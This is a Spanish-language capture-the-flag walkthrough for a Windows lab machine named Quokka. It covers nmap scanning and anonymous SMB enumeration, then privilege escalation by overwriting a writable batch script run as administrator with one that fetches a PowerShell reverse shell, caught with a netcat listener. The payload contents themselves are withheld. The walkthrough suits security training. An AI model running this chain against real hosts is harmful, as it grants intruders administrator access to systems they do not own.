# 🏴‍☠️ Write-up — CTF Windows: Quokka

## 🔍 1. Escaneo de puertos

Realizamos un escaneo con `nmap` que reveló varios servicios abiertos:

```bash
nmap -sC -sV -p- 192.168.1.56
```

### Puertos relevantes encontrados:
- `80/tcp` → Microsoft IIS 10.0
- `135/tcp`, `139/tcp`, `445/tcp` → Servicios SMB
- `5985/tcp` → WinRM
- Muchos puertos MSRPC (49664–49672)

---

## 📁 2. Enumeración de recursos compartidos (SMB)

```bash
smbclient -L //192.168.1.56 -N
```

Se encontró el recurso **`Compartido`**, accesible anónimamente.

---

## 🗂 3. Navegación por carpetas compartidas

Accedimos a:

```bash
smbclient //192.168.1.56/Compartido -N
```

Carpetas exploradas:
- `Documentación` → Contenía archivos `.pptx` y `.pdf`, pero vacíos
- `Logs`, `Proyectos`

Dentro de **`Proyectos/Quokka`**, encontramos:
- `Documentación_Interna.docx` → Indicaba que el proyecto era interno
- Carpeta `Código` con archivos `.bat`

---

## 💣 4. Identificación de escalada de privilegios

En `Código/`, descubrimos:

- `mantenimiento - copia.bat` con el siguiente contenido clave:
  ```bat
  :: Este script se ejecuta con permisos de administrador cada minuto
  move "C:\Logs\*.log" "C:\Backup\OldLogs\"
  del /q "C:\Temp\*.*"
  ```

💡 Esto reveló una **tarea programada que ejecuta el script como administrador**, lo que permite una **escalada de privilegios por sustitución de script** si tenemos permisos de escritura.

---

## ✍️ 5. Confirmación de permisos de escritura

Subimos un archivo de prueba con:

```bash
put prueba.txt
```

✅ Confirmado: podemos escribir en la carpeta donde se encuentra el script `mantenimiento.bat`.

---

## 🔥 6. Payload de reverse shell

Creamos un `shell.ps1` con una reverse shell en PowerShell y un `malicioso.bat` que lo descarga y ejecuta automáticamente.

⚠️ **Contenido de estos archivos no incluido por detección antivirus.**

---

## 📤 7. Sustitución del script original

```bash
put malicioso.bat mantenimiento.bat
```

---

## 📡 8. Servidor HTTP y escucha

```bash
python3 -m http.server 8000
nc -lvnp 4444
```

---

## 🏁 9. Shell recibida como administrador

Tras un minuto:

```powershell
whoami
# win-vru3gg3dp1j\administrador
```

✔️ Escalada de privilegios completada.

---

## ✅ Técnicas utilizadas

- Enumeración de SMB anónima
- Acceso a recursos compartidos
- Identificación de script con permisos elevados
- Escalada por **escritura en script ejecutado como SYSTEM**
- Reverse shell en PowerShell (no incluida)
- Sustitución de script por payload malicioso
